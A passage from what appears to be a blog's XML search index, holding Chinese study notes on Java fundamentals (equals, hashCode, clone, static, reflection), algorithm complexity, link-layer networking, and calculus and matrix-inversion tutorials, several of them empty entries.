and D &#125;&#125; 涉及到重写时，方法调用的优先级为： this.show(O) super.show(O) this.show((super)O) super.show((super)O) 五、Object 通用方法概览12345678910111213141516171819202122public native int hashCode()public boolean equals(Object obj)protected native Object clone() throws CloneNotSupportedExceptionpublic String toString()public final native Class&lt;?&gt; getClass()protected void finalize() throws Throwable &#123;&#125;public final native void notify()public final native void notifyAll()public final native void wait(long timeout) throws InterruptedExceptionpublic final void wait(long timeout, int nanos) throws InterruptedExceptionpublic final void wait() throws InterruptedException equals()1. 等价关系 Ⅰ 自反性 1x.equals(x); // true Ⅱ 对称性 1x.equals(y) == y.equals(x); // true Ⅲ 传递性 12if (x.equals(y) &amp;&amp; y.equals(z)) x.equals(z); // true; Ⅳ 一致性 多次调用 equals() 方法结果不变 1x.equals(y) == x.equals(y); // true Ⅴ 与 null 的比较 对任何不是 null 的对象 x 调用 x.equals(null) 结果都为 false 1x.equals(null); // false; 2. 等价与相等 对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。 对于引用类型，== 判断两个变量是否引用同一个对象，而 equals() 判断引用的对象是否等价。 1234Integer x = new Integer(1);Integer y = new Integer(1);System.out.println(x.equals(y)); // trueSystem.out.println(x == y); // false 3. 实现 检查是否为同一个对象的引用，如果是直接返回 true； 检查是否是同一个类型，如果不是，直接返回 false； 将 Object 对象进行转型； 判断每个关键域是否相等。 123456789101112131415161718192021222324public class EqualExample &#123; private int x; private int y; private int z; public EqualExample(int x, int y, int z) &#123; this.x = x; this.y = y; this.z = z; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; EqualExample that = (EqualExample) o; if (x != that.x) return false; if (y != that.y) return false; return z == that.z; &#125;&#125; hashCode()hashCode() 返回散列值，而 equals() 是用来判断两个对象是否等价。等价的两个对象散列值一定相同，但是散列值相同的两个对象不一定等价。 在覆盖 equals() 方法时应当总是覆盖 hashCode() 方法，保证等价的两个对象散列值也相等。 下面的代码中，新建了两个等价的对象，并将它们添加到 HashSet 中。我们希望将这两个对象当成一样的，只在集合中添加一个对象，但是因为 EqualExample 没有实现 hasCode() 方法，因此这两个对象的散列值是不同的，最终导致集合添加了两个等价的对象。 1234567EqualExample e1 = new EqualExample(1, 1, 1);EqualExample e2 = new EqualExample(1, 1, 1);System.out.println(e1.equals(e2)); // trueHashSet&lt;EqualExample&gt; set = new HashSet&lt;&gt;();set.add(e1);set.add(e2);System.out.println(set.size()); // 2 理想的散列函数应当具有均匀性，即不相等的对象应当均匀分布到所有可能的散列值上。这就要求了散列函数要把所有域的值都考虑进来。可以将每个域都当成 R 进制的某一位，然后组成一个 R 进制的整数。R 一般取 31，因为它是一个奇素数，如果是偶数的话，当出现乘法溢出，信息就会丢失，因为与 2 相乘相当于向左移一位。 一个数与 31 相乘可以转换成移位和减法：31*x == (x&lt;&lt;5)-x，编译器会自动进行这个优化。 12345678@Overridepublic int hashCode() &#123; int result = 17; result = 31 * result + x; result = 31 * result + y; result = 31 * result + z; return result;&#125; toString()默认返回 ToStringExample@4554617c 这种形式，其中 @ 后面的数值为散列码的无符号十六进制表示。 12345678public class ToStringExample &#123; private int number; public ToStringExample(int number) &#123; this.number = number; &#125;&#125; 12ToStringExample example = new ToStringExample(123);System.out.println(example.toString()); 1ToStringExample@4554617c clone()1. cloneable clone() 是 Object 的 protected 方法，它不是 public，一个类不显式去重写 clone()，其它类就不能直接去调用该类实例的 clone() 方法。 1234public class CloneExample &#123; private int a; private int b;&#125; 12CloneExample e1 = new CloneExample();// CloneExample e2 = e1.clone(); // 'clone()' has protected access in 'java.lang.Object' 重写 clone() 得到以下实现： 123456789public class CloneExample &#123; private int a; private int b; @Override public CloneExample clone() throws CloneNotSupportedException &#123; return (CloneExample)super.clone(); &#125;&#125; 123456CloneExample e1 = new CloneExample();try &#123; CloneExample e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125; 1java.lang.CloneNotSupportedException: CloneExample 以上抛出了 CloneNotSupportedException，这是因为 CloneExample 没有实现 Cloneable 接口。 应该注意的是，clone() 方法并不是 Cloneable 接口的方法，而是 Object 的一个 protected 方法。Cloneable 接口只是规定，如果一个类没有实现 Cloneable 接口又调用了 clone() 方法，就会抛出 CloneNotSupportedException。 123456789public class CloneExample implements Cloneable &#123; private int a; private int b; @Override public Object clone() throws CloneNotSupportedException &#123; return super.clone(); &#125;&#125; 2. 浅拷贝 拷贝对象和原始对象的引用类型引用同一个对象。 123456789101112131415161718192021222324public class ShallowCloneExample implements Cloneable &#123; private int[] arr; public ShallowCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected ShallowCloneExample clone() throws CloneNotSupportedException &#123; return (ShallowCloneExample) super.clone(); &#125;&#125; 123456789ShallowCloneExample e1 = new ShallowCloneExample();ShallowCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 222 3. 深拷贝 拷贝对象和原始对象的引用类型引用不同对象。 1234567891011121314151617181920212223242526272829public class DeepCloneExample implements Cloneable &#123; private int[] arr; public DeepCloneExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125; @Override protected DeepCloneExample clone() throws CloneNotSupportedException &#123; DeepCloneExample result = (DeepCloneExample) super.clone(); result.arr = new int[arr.length]; for (int i = 0; i &lt; arr.length; i++) &#123; result.arr[i] = arr[i]; &#125; return result; &#125;&#125; 123456789DeepCloneExample e1 = new DeepCloneExample();DeepCloneExample e2 = null;try &#123; e2 = e1.clone();&#125; catch (CloneNotSupportedException e) &#123; e.printStackTrace();&#125;e1.set(2, 222);System.out.println(e2.get(2)); // 2 4. clone() 的替代方案 使用 clone() 方法来拷贝一个对象即复杂又有风险，它会抛出异常，并且还需要类型转换。Effective Java 书上讲到，最好不要去使用 clone()，可以使用拷贝构造函数或者拷贝工厂来拷贝一个对象。 1234567891011121314151617181920212223242526public class CloneConstructorExample &#123; private int[] arr; public CloneConstructorExample() &#123; arr = new int[10]; for (int i = 0; i &lt; arr.length; i++) &#123; arr[i] = i; &#125; &#125; public CloneConstructorExample(CloneConstructorExample original) &#123; arr = new int[original.arr.length]; for (int i = 0; i &lt; original.arr.length; i++) &#123; arr[i] = original.arr[i]; &#125; &#125; public void set(int index, int value) &#123; arr[index] = value; &#125; public int get(int index) &#123; return arr[index]; &#125;&#125; 1234CloneConstructorExample e1 = new CloneConstructorExample();CloneConstructorExample e2 = new CloneConstructorExample(e1);e1.set(2, 222);System.out.println(e2.get(2)); // 2 六、关键字final1. 数据 声明数据为常量，可以是编译时常量，也可以是在运行时被初始化后不能被改变的常量。 对于基本类型，final 使数值不变； 对于引用类型，final 使引用不变，也就不能引用其它对象，但是被引用的对象本身是可以修改的。 1234final int x = 1;// x = 2; // cannot assign value to final variable 'x'final A y = new A();y.a = 1; 2. 方法 声明方法不能被子类重写。 private 方法隐式地被指定为 final，如果在子类中定义的方法和基类中的一个 private 方法签名相同，此时子类的方法不是重写基类方法，而是在子类中定义了一个新的方法。 3. 类 声明类不允许被继承。 static1. 静态变量 静态变量：又称为类变量，也就是说这个变量属于类的，类所有的实例都共享静态变量，可以直接通过类名来访问它。静态变量在内存中只存在一份。 实例变量：每创建一个实例就会产生一个实例变量，它与该实例同生共死。 123456789101112public class A &#123; private int x; // 实例变量 private static int y; // 静态变量 public static void main(String[] args) &#123; // int x = A.x; // Non-static field 'x' cannot be referenced from a static context A a = new A(); int x = a.x; int y = A.y; &#125;&#125; 2. 静态方法 静态方法在类加载的时候就存在了，它不依赖于任何实例。所以静态方法必须有实现，也就是说它不能是抽象方法。 12345public abstract class A &#123; public static void func1()&#123; &#125; // public abstract static void func2(); // Illegal combination of modifiers: 'abstract' and 'static'&#125; 只能访问所属类的静态字段和静态方法，方法中不能有 this 和 super 关键字。 1234567891011public class A &#123; private static int x; private int y; public static void func1()&#123; int a = x; // int b = y; // Non-static field 'y' cannot be referenced from a static context // int b = this.y; // 'A.this' cannot be referenced from a static context &#125;&#125; 3. 静态语句块 静态语句块在类初始化时运行一次。 12345678910public class A &#123; static &#123; System.out.println("123"); &#125; public static void main(String[] args) &#123; A a1 = new A(); A a2 = new A(); &#125;&#125; 1123 4. 静态内部类 非静态内部类依赖于外部类的实例，而静态内部类不需要。 123456789101112131415public class OuterClass &#123; class InnerClass &#123; &#125; static class StaticInnerClass &#123; &#125; public static void main(String[] args) &#123; // InnerClass innerClass = new InnerClass(); // 'OuterClass.this' cannot be referenced from a static context OuterClass outerClass = new OuterClass(); InnerClass innerClass = outerClass.new InnerClass(); StaticInnerClass staticInnerClass = new StaticInnerClass(); &#125;&#125; 静态内部类不能访问外部类的非静态的变量和方法。 5. 静态导包 在使用静态变量和方法时不用再指明 ClassName，从而简化代码，但可读性大大降低。 1import static com.xxx.ClassName.* 6. 初始化顺序 静态变量和静态语句块优先于实例变量和普通语句块，静态变量和静态语句块的初始化顺序取决于它们在代码中的顺序。 1public static String staticField = "静态变量"; 123static &#123; System.out.println("静态语句块");&#125; 1public String field = "实例变量"; 123&#123; System.out.println("普通语句块");&#125; 最后才是构造函数的初始化。 123public InitialOrderTest() &#123; System.out.println("构造函数");&#125; 存在继承的情况下，初始化顺序为： 父类（静态变量、静态语句块） 子类（静态变量、静态语句块） 父类（实例变量、普通语句块） 父类（构造函数） 子类（实例变量、普通语句块） 子类（构造函数） 七、反射每个类都有一个 Class 对象，包含了与类有关的信息。当编译一个新类时，会产生一个同名的 .class 文件，该文件内容保存着 Class 对象。 类加载相当于 Class 对象的加载，类在第一次使用时才动态加载到 JVM 中。也可以使用 Class.forName(&quot;com.mysql.jdbc.Driver&quot;) 这种方式来控制类的加载，该方法会返回一个 Class 对象。 反射可以提供运行时的类信息，并且这个类可以在运行时才加载进来，甚至在编译时期该类的 .class 不存在也可以加载进来。 Class 和 java.lang.reflect 一起对反射提供了支持，java.lang.reflect 类库主要包含了以下三个类： Field ：可以使用 get() 和 set() 方法读取和修改 Field 对象关联的字段； Method ：可以使用 invoke() 方法调用与 Method 对象关联的方法； Constructor ：可以用 Constructor 创建新的对象。 反射的优点： 可扩展性 ：应用程序可以利用全限定名创建可扩展对象的实例，来使用来自外部的用户自定义类。 类浏览器和可视化开发环境 ：一个类浏览器需要可以枚举类的成员。可视化开发环境（如 IDE）可以从利用反射中可用的类型信息中受益，以帮助程序员编写正确的代码。 调试器和测试工具 ： 调试器需要能够检查一个类里的私有成员。测试工具可以利用反射来自动地调用类里定义的可被发现的 API 定义，以确保一组测试中有较高的代码覆盖率。 反射的缺点： 尽管反射非常强大，但也不能滥用。如果一个功能可以不用反射完成，那么最好就不用。在我们使用反射技术时，下面几条内容应该牢记于心。 性能开销 ：反射涉及了动态类型的解析，所以 JVM 无法对这些代码进行优化。因此，反射操作的效率要比那些非反射操作低得多。我们应该避免在经常被执行的代码或对性能要求很高的程序中使用反射。 安全限制 ：使用反射技术要求程序必须在一个没有安全限制的环境中运行。如果一个程序必须在有安全限制的环境中运行，如 Applet，那么这就是个问题了。 内部暴露 ：由于反射允许代码执行一些在正常情况下不被允许的操作（比如访问私有的属性和方法），所以使用反射可能会导致意料之外的副作用，这可能导致代码功能失调并破坏可移植性。反射代码破坏了抽象性，因此当平台发生改变的时候，代码的行为就有可能也随着变化。 Trail: The Reflection API 深入解析 Java 反射（1）- 基础 八、异常Throwable 可以用来表示任何可以作为异常抛出的类，分为两种： Error 和 Exception。其中 Error 用来表示 JVM 无法处理的错误，Exception 分为两种： 受检异常 ：需要用 try…catch… 语句捕获并进行处理，并且可以从异常中恢复； 非受检异常 ：是程序运行时错误，例如除 0 会引发 Arithmetic Exception，此时程序崩溃并且无法恢复。 Java 入门之异常处理 Java 异常的面试问题及答案 -Part 1 九、泛型123456public class Box&lt;T&gt; &#123; // T stands for "Type" private T t; public void set(T t) &#123; this.t = t; &#125; public T get() &#123; return t; &#125;&#125; Java 泛型详解 10 道 Java 泛型面试题 十、注解Java 注解是附加在代码中的一些元信息，用于一些工具在编译、运行时进行解析和使用，起到说明、配置的功能。注解不会也不能影响代码的实际逻辑，仅仅起到辅助性的作用。 注解 Annotation 实现原理与自定义注解例子 十一、特性Java 各版本的新特性New highlights in Java SE 8 Lambda Expressions Pipelines and Streams Date and Time API Default Methods Type Annotations Nashhorn JavaScript Engine Concurrent Accumulators Parallel operations PermGen Error Removed New highlights in Java SE 7 Strings in Switch Statement Type Inference for Generic Instance Creation Multiple Exception Handling Support for Dynamic Languages Try with Resources Java nio Package Binary Literals, Underscore in literals Diamond Syntax Difference between Java 1.8 and Java 1.7? Java 8 特性 Java 与 C++ 的区别 Java 是纯粹的面向对象语言，所有的对象都继承自 java.lang.Object，C++ 为了兼容 C 即支持面向对象也支持面向过程。 Java 通过虚拟机从而实现跨平台特性，但是 C++ 依赖于特定的平台。 Java 没有指针，它的引用可以理解为安全指针，而 C++ 具有和 C 一样的指针。 Java 支持自动垃圾回收，而 C++ 需要手动回收。 Java 不支持多重继承，只能通过实现多个接口来达到相同目的，而 C++ 支持多重继承。 Java 不支持操作符重载，虽然可以对两个 String 对象执行加法运算，但是这是语言内置支持的操作，不属于操作符重载，而 C++ 可以。 Java 的 goto 是保留字，但是不可用，C++ 可以使用 goto。 Java 不支持条件编译，C++ 通过 #ifdef #ifndef 等预处理命令从而实现条件编译。 What are the main differences between Java and C++? JRE or JDK JRE is the JVM program, Java application need to run on JRE. JDK is a superset of JRE, JRE + tools for developing java programs. e.g, it provides the compiler “javac”]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[齐次微分方程]]></title>
    <url>%2F2017%2F09%2F03%2F%E9%BD%90%E6%AC%A1%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>微分方程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[复杂度]]></title>
    <url>%2F2017%2F09%2F03%2F%E5%A4%8D%E6%9D%82%E5%BA%A6%2F</url>
    <content type="text"><![CDATA[时间复杂度计算机科学中，算法的时间复杂度是一个函数，它定性描述了该算法的运行时间。 时间复杂度常用大O符号表述，不包括这个函数的低阶项和首项系数。 1O(1)&lt;O(logn)&lt;O(n)&lt;O(nlogn)&lt;O(n²)&lt;O(n³)&lt;O(2ⁿ)&lt;O(n!) 空间复杂度空间复杂度(Space Complexity)是对一个算法在运行过程中临时占用存储空间大小的量度，记做S(n)=O(f(n))。 若算法执行时所需要的辅助空间相对于输入数据量n而言是一个常数，则称这个算法的辅助空间为O(1); 递归算法的空间复杂度：递归深度N*每次递归所要的辅助空间， 如果每次递归所需的辅助空间是常数，则递归的空间复杂度是 O(N).]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>时间复杂度</tag>
        <tag>空间复杂度</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一阶线性微分方程的解]]></title>
    <url>%2F2017%2F09%2F01%2F%E4%B8%80%E9%98%B6%E7%BA%BF%E6%80%A7%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B%E7%9A%84%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>微分方程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[链路层]]></title>
    <url>%2F2017%2F09%2F01%2F%E9%93%BE%E8%B7%AF%E5%B1%82%2F</url>
    <content type="text"><![CDATA[基本问题1. 封装成帧将网络层传下来的分组添加首部和尾部，用于标记帧的开始和结束。 2. 透明传输透明表示一个实际存在的事物看起来好像不存在一样。 帧使用首部和尾部进行定界，如果帧的数据部分含有和首部尾部相同的内容，那么帧的开始和结束位置就会被错误的判定。需要在数据部分出现首部尾部相同的内容前面插入转义字符。如果数据部分出现转义字符，那么就在转义字符前面再加个转义字符。在接收端进行处理之后可以还原出原始数据。这个过程透明传输的内容是转义字符，用户察觉不到转义字符的存在。 3. 差错检测目前数据链路层广泛使用了循环冗余检验（CRC）来检查比特差错。 信道分类1. 广播信道一对多通信，一个节点发送的数据能够被广播信道上所有的节点接收到。 所有的节点都在同一个广播信道上发送数据，因此需要有专门的控制方法进行协调，避免发生冲突（冲突也叫碰撞）。 主要有两种控制方法进行协调，一个是使用信道复用技术，一是使用 CSMA/CD 协议。 2. 点对点信道一对一通信。 因为不会发生碰撞，因此也比较简单，使用 PPP 协议进行控制。 信道复用技术1. 频分复用频分复用的所有主机在相同的时间占用不同的频率带宽资源。 2. 时分复用时分复用的所有主机在不同的时间占用相同的频率带宽资源。 使用频分复用和时分复用进行通信，在通信的过程中主机会一直占用一部分信道资源。但是由于计算机数据的突发性质，通信过程没必要一直占用信道资源而不让出给其它用户使用，因此这两种方式对信道的利用率都不高。 3. 统计时分复用是对时分复用的一种改进，不固定每个用户在时分复用帧中的位置，只要有数据就集中起来组成统计时分复用帧然后发送。 4. 波分复用光的频分复用。由于光的频率很高，因此习惯上用波长而不是频率来表示所使用的光载波。 5. 码分复用为每个用户分配 m bit 的码片，并且所有的码片正交，对于任意两个码片 和 有 为了讨论方便，取 m=8，设码片 为 00011011。在拥有该码片的用户发送比特 1 时就发送该码片，发送比特 0 时就发送该码片的反码 11100100。 在计算时将 00011011 记作 (-1 -1 -1 +1 +1 -1 +1 +1)，可以得到 其中 为 的反码。 利用上面的式子我们知道，当接收端使用码片 对接收到的数据进行内积运算时，结果为 0 的是其它用户发送的数据，结果为 1 的是用户发送的比特 1，结果为 -1 的是用户发送的比特 0。 码分复用需要发送的数据量为原先的 m 倍。 CSMA/CD 协议CSMA/CD 表示载波监听多点接入 / 碰撞检测。 多点接入 ：说明这是总线型网络，许多主机以多点的方式连接到总线上。 载波监听 ：每个主机都必须不停地监听信道。在发送前，如果监听到信道正在使用，就必须等待。 碰撞检测 ：在发送中，如果监听到信道已有其它主机正在发送数据，就表示发生了碰撞。虽然每个主机在发送数据之前都已经监听到信道为空闲，但是由于电磁波的传播时延的存在，还是有可能会发生碰撞。 记端到端的传播时延为 τ，最先发送的站点最多经过 2τ 就可以知道是否发生了碰撞，称 2τ 为 争用期 。只有经过争用期之后还没有检测到碰撞，才能肯定这次发送不会发生碰撞。 当发生碰撞时，站点要停止发送，等待一段时间再发送。这个时间采用 截断二进制指数退避算法 来确定。从离散的整数集合 {0, 1, .., (2k-1)} 中随机取出一个数，记作 r，然后取 r 倍的争用期作为重传等待时间。 PPP 协议互联网用户通常需要连接到某个 ISP 之后才能接入到互联网，PPP 协议是用户计算机和 ISP 进行通信时所使用的数据链路层协议。 PPP 的帧格式： F 字段为帧的定界符 A 和 C 字段暂时没有意义 FCS 字段是使用 CRC 的检验序列 信息部分的长度不超过 1500 MAC 地址MAC 地址是链路层地址，长度为 6 字节（48 位），用于唯一标识网络适配器（网卡）。 一台主机拥有多少个网络适配器就有多少个 MAC 地址。例如笔记本电脑普遍存在无线网络适配器和有线网络适配器，因此就有两个 MAC 地址。 局域网局域网是一种典型的广播信道，主要特点是网络为一个单位所拥有，且地理范围和站点数目均有限。 主要有以太网、令牌环网、FDDI 和 ATM 等局域网技术，目前以太网占领着有线局域网市场。 可以按照网络拓扑结构对局域网进行分类： 以太网以太网是一种星型拓扑结构局域网。 早期使用集线器进行连接，集线器是一种物理层设备， 作用于比特而不是帧，当一个比特到达接口时，集线器重新生成这个比特，并将其能量强度放大，从而扩大网络的传输距离，之后再将这个比特发送到其它所有接口。如果集线器同时收到两个不同接口的帧，那么就发生了碰撞。 目前以太网使用交换机替代了集线器，交换机是一种链路层设备，它不会发生碰撞，能根据 MAC 地址进行存储转发。 以太网帧格式： 类型 ：标记上层使用的协议； 数据 ：长度在 46-1500 之间，如果太小则需要填充； FCS ：帧检验序列，使用的是 CRC 检验方法； 交换机交换机具有自学习能力，学习的是交换表的内容，交换表中存储着 MAC 地址到接口的映射。 正是由于这种自学习能力，因此交换机是一种即插即用设备，不需要网络管理员手动配置交换表内容。 下图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧，主机 B 回应该帧向主机 A 发送数据包时，交换机查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 2 的映射。 虚拟局域网虚拟局域网可以建立与物理位置无关的逻辑组，只有在同一个虚拟局域网中的成员才会收到链路层广播信息。 例如下图中 (A1, A2, A3, A4) 属于一个虚拟局域网，A1 发送的广播会被 A2、A3、A4 收到，而其它站点收不到。 使用 VLAN 干线连接来建立虚拟局域网，每台交换机上的一个特殊接口被设置为干线接口，以互连 VLAN 交换机。IEEE 定义了一种扩展的以太网帧格式 802.1Q，它在标准以太网帧上加进了 4 字节首部 VLAN 标签，用于表示该帧属于哪一个虚拟局域网。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>链路层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分离变量法]]></title>
    <url>%2F2017%2F07%2F15%2F%E5%88%86%E7%A6%BB%E5%8F%98%E9%87%8F%E6%B3%95%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>分离变量法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微分方程入门]]></title>
    <url>%2F2017%2F07%2F15%2F%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>微分方程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[积分近似值]]></title>
    <url>%2F2017%2F07%2F11%2F%E7%A7%AF%E5%88%86%E8%BF%91%E4%BC%BC%E5%80%BC%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>积分近似值</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[弧长]]></title>
    <url>%2F2017%2F07%2F11%2F%E5%BC%A7%E9%95%BF%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>弧长</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[定积分]]></title>
    <url>%2F2017%2F07%2F05%2F%E5%AE%9A%E7%A7%AF%E5%88%86%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>定积分</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[换元积分法]]></title>
    <url>%2F2017%2F07%2F01%2F%E6%8D%A2%E5%85%83%E7%A7%AF%E5%88%86%E6%B3%95%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>换元积分法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[积分法则]]></title>
    <url>%2F2017%2F06%2F09%2F%E7%A7%AF%E5%88%86%E6%B3%95%E5%88%99%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>积分法则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[泰勒级数]]></title>
    <url>%2F2017%2F06%2F05%2F%E6%B3%B0%E5%8B%92%E7%BA%A7%E6%95%B0%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>泰勒级数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[隐微分法]]></title>
    <url>%2F2017%2F06%2F05%2F%E9%9A%90%E5%BE%AE%E5%88%86%E6%B3%95%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[导数法则]]></title>
    <url>%2F2017%2F06%2F01%2F%E5%AF%BC%E6%95%B0%E6%B3%95%E5%88%99%2F</url>
    <content type="text"><![CDATA[导数 是在函数上任何一点的坡度。 有很多法则可以帮助我们去求导数。 例子： 常数 （像 3）的坡度永远是 0 直线 （像 2x 是 2，3x 是 3，以此类推） 等等。]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>微积分</tag>
        <tag>导数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[余子式代数余子式求逆矩阵]]></title>
    <url>%2F2017%2F05%2F06%2F%E4%BD%99%E5%AD%90%E5%BC%8F%E4%BB%A3%E6%95%B0%E4%BD%99%E5%AD%90%E5%BC%8F%E6%B1%82%E9%80%86%E7%9F%A9%E9%98%B5%2F</url>
    <content type="text"><![CDATA[我们可以这样去求逆矩阵: 一、求余子式矩阵， 二、转成代数余子式矩阵， 三、转成伴随矩阵， 四、乘以 1/行列式。 最好是用实例来解释！ 例子：求 A 的逆： 要做四步。全都是简单的算术，但有很多计算，所以要小心，不要犯错！ 一、余子式矩阵第一步是造一个 “余子式矩阵”。这步有最多计算。 为矩阵的每个元素： 不使用在本行与本列的元素 计算剩下来的值的行列式 把行列式的结果放进一个矩阵（”余子式矩阵”） 行列式2×2 矩阵（2行和2列）的行列式很容易：ad-bc 想：十字乘法蓝色 代表 正 （+ad），红色 代表 负 （-bc） （3×3 矩阵会比较复杂，。。。。。。） 计算这是”余子式矩阵“的头两个和最后两个计算（留意我不使用在元素本行和本列的值，只用剩下来的值来算行列式）： 这是整个矩阵的计算程序： 二、代数余子式矩阵这个容易！把”纵横交错”排列的正负号放在”余子式矩阵”上。换句话说，我们需要每隔一个格改变正负号，像这样： 三、伴随“转置” 以上的矩阵。。。。。。就是沿对角线对调元素的位置（在对角线上的元素不变）： 四、乘以 1/行列式求原本的矩阵的行列式。这不困难，因为在求”余子式矩阵”时我们已经计算了局部的行列式。 所以：把顶行的每个元素乘以其”余子式”的行列式： 行列式 = 3×2 - 0×2 + 2×2 = 10 现在把伴随矩阵乘以 1/行列式： 大功告成！ 把这答案与在 用初等行运算来求逆矩阵 里求的逆矩阵比较一下。是不是一样？你喜欢哪个方法？ 较大的矩阵求更大的矩阵的逆矩阵都是用同样的方法（例如 4×4 和 5×5等），可是，真的要做很多很多的计算！ 4×4 矩阵要做 16个 3×3 行列式。所以通常是用电脑来做（例如 矩阵计算器。） 结论 为每个元素，计算不在其本行或本列 的值 的行列式 来构成余子式矩阵 把纵横交错排列的正负号放在”余子式矩阵”上以形成代数余子式矩阵 转置矩阵以成为伴随矩阵 乘以 1/行列式 以成为逆矩阵]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
        <tag>矩阵</tag>
        <tag>余子式</tag>
        <tag>代数余子式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高斯若尔当求逆矩阵]]></title>
    <url>%2F2017%2F05%2F03%2F%E9%AB%98%E6%96%AF%E8%8B%A5%E5%B0%94%E5%BD%93%E6%B1%82%E9%80%86%E7%9F%A9%E9%98%B5%2F</url>
    <content type="text"><![CDATA[这是个有趣的求逆矩阵方法。。。。。。 。。。。。。玩玩这些行 （加、乘或对换） 直至把矩阵 A 变成单位矩阵 I。 ![矩阵 A \ I 变成 I \ A 逆](https://www.shuxuele.com/algebra/images/matrix-gauss-jordan1.svg) 在单位矩阵上也做一模一样的运算， 单位矩阵便会奇妙的变成 逆矩阵！ “初等行运算”是简单的运算，像把行相加，乘，对换位置。。。。。。我们先来看例子： 例子：求 “A” 的逆： 把给予的矩阵 A 与 单位矩阵 I 并排写下来： （这叫 “增广矩阵”） 单位矩阵“单位矩阵” 在矩阵中的意思是和数字里 “1” 的意思相若的： 3x3 单位矩阵 它是 “方形”的（相同数目的行和列）， 它有 1 在对角线上，0 在所有其他位置上， 它的 符号是大写字母 I。 接着我们尽力去把 “A” （在左边的矩阵）变成单位矩阵。我们的目标是把矩阵 A 的对角线变成全是 1，而在所有其他位置都是 0 （单位矩阵）。。。。。。在右边的矩阵也做同样的运算。 我们只能做这些 “初等行运算”： 对换两行的位置 把一行里的每个元素乘以或除以一个常数 把一行加上另一行的倍，并取代前者。 以上一定要以全行运算，像这样： 先把 A 写在 I 左边 把 行2 加到 行1 上， 把 行1 乘以 5， 把第一行的两倍从第二行减去， 把第二行乘以 -1/2， 把第二和第三行对换位置， 最后，把第三行从第二行减去， 做好了！ 矩阵 A 变成单位矩阵。。。。。。 。。。。。。同时单位矩阵便成 A-1了 大功告成！像玩魔术一样，和解谜题一样好玩。 注意：没有 “绝对正确” 的方法来做这个，只有不停尝试，直至成功为止。“自古成功在尝试”！ （把这答案与在 用余子式、代数余子式和伴随 来求逆矩阵 里求的逆矩阵比较一下。是不是一样？你喜欢哪个方法？） 较大的矩阵求较大的矩阵的逆矩阵都是用同样的方法。我们用这个 4x4 矩阵来试试： 开始： 试试自己来做（我一开始会把第一行除以 4，但你可随意用你自己的方法）。 矩阵计算器来检测答案 （”inv(A)” 键）。 